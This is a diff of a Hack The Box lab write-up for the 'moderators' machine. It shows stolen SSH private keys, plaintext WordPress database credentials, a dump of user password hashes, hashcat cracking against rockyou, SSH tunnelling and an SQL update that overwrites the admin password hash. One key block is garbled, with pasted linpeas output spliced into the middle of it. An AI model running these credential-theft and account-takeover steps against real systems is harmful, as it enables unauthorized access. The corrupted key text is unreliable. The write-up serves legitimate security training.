@@ -266,7 +266,14 @@ cat user.txt
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn
+NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357Lf╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rwxr----- 1 lexi moderators 3118 Sep 11  2021 /opt/site.new/wp-config.php                                                     
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpressuser' );
+define( 'DB_PASSWORD', 'wordpresspassword123!!' );
+define( 'DB_HOST', 'localhost' );
+
+XjhIuTG4qkX6eY4iCw7EBGKwaEryn
 ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM
 ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ/QRXYrblAj8Bo1owGebWUBlB/tMcO3Yqvaa
 QCuzVluSShMrGKJVjL0n2Uvqf/Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV
@@ -301,5 +308,131 @@ egq/DaGJECdxk9CNDElLVQxBs3X4i/AAAAwQDCIEQcdMnPI9cP5WUOmWWNH6jlpEpsF0qm
 p668wxSJC8y/5cYKTeE8rwhDXxP0I5ZJztCYf8bL2BWSWF/h4iiUW4mMKyAzvg/iDfjGmb
 xA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJly
 J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+```
+# John Privilege Escalation
+
+```console
+lexi@moderators:/tmp$ mysql -u wordpressuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 41
+Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases
+    -> ;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| wordpress          |
++--------------------+
+2 rows in set (0.002 sec)
+
+MariaDB [(none)]> use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [wordpress]> show tables
+    -> ;
++----------------------------+
+| Tables_in_wordpress        |
++----------------------------+
+| wp_commentmeta             |
+| wp_comments                |
+| wp_links                   |
+| wp_options                 |
+| wp_pms_category            |
+| wp_pms_passwords           |
+| wp_postmeta                |
+| wp_posts                   |
+| wp_prflxtrflds_fields_meta |
+| wp_term_relationships      |
+| wp_term_taxonomy           |
+| wp_termmeta                |
+| wp_terms                   |
+| wp_usermeta                |
+| wp_users                   |
+| wp_wpfm_backup             |
++----------------------------+
+16 rows in set (0.001 sec)
+
+MariaDB [wordpress]> select * from wp_users;
++----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0 | admin         | admin@moderators.htb | http://192.168.1.4:8080 | 2021-09-11 05:30:20 |                     |           0 | admin        |
+|  2 | lexi       | $P$BZ0Fj92qgnvg4F52r3lpwHejcXag461 | lexi          | lexi@moderators.htb  |                         | 2021-09-12 16:51:16 |                     |           0 | lexi         |
++----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
+2 rows in set (0.001 sec)
+```
+```
+└─$ ssh -L 8080:localhost:8080 -i id_rsa lexi@10.129.43.133 
+```
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+
+```console
+└─$ echo '$P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0' > hash
+└─$ hashcat hash /usr/share/wordlists/rockyou.txt
+
+```
+https://www.useotools.com/wordpress-password-hash-generator/output
+
+Password must be hashed to run the password
+
+```console
+MariaDB [wordpress]> UPDATE wp_users SET user_pass='$P$BL7sipqsbDoZ7yvWY9PxnY.OkXBVik/' WHERE user_login='admin';
+Query OK, 1 row affected (0.007 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+```
+sudo vim /etc/hosts
+add moderators.htb to localhost
+
+
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
 -----END OPENSSH PRIVATE KEY-----
 ```
